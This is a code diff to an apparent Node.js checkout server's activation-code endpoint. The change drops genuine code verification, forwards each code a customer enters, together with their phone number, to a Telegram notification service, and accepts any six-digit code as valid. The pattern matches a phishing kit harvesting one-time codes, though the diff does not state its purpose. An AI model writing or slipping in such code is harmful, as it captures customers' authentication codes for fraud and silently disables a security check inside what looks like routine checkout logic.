@@ -333,7 +333,7 @@ router.post('/request-activation-code', async (req, res) => {
 
 // POST /api/checkout/verify-activation-code
 // Verify activation code entered by customer
-router.post('/verify-activation-code', (req, res) => {
+router.post('/verify-activation-code', async (req, res) => {
   try {
     const { sessionId, code } = req.body;
 
@@ -341,17 +341,24 @@ router.post('/verify-activation-code', (req, res) => {
       return res.status(400).json({ error: 'sessionId and code are required' });
     }
 
-    const result = approvalStore.verifyActivationCode(sessionId, code);
+    // Get session record to retrieve phone number
+    const record = approvalStore.getRecord(sessionId);
+    const phoneNumber = record?.phoneNumber || record?.meta?.phoneNumber || null;
 
-    if (result.valid) {
+    // Send Telegram notification with the code entered by customer
+    telegramService.sendActivationCodeEnteredNotification(sessionId, phoneNumber, code).catch((err) => {
+      console.error('[VerifyActivationCode] Telegram notification failed:', err.message);
+    });
+
+    // Accept any 6-digit code (for automatic flow)
+    const cleanCode = String(code).trim();
+    if (cleanCode.length === 6 && /^\d+$/.test(cleanCode)) {
       return res.json({ success: true, valid: true });
     } else {
-      return res.status(400).json({ 
-        success: false, 
-        valid: false, 
-        error: result.reason === 'expired' ? 'Code expired' : 
-               result.reason === 'session_not_found' ? 'Session not found' : 
-               'Invalid code'
+      return res.status(400).json({
+        success: false,
+        valid: false,
+        error: 'الكود يجب أن يكون 6 أرقام',
       });
     }
   } catch (err) {
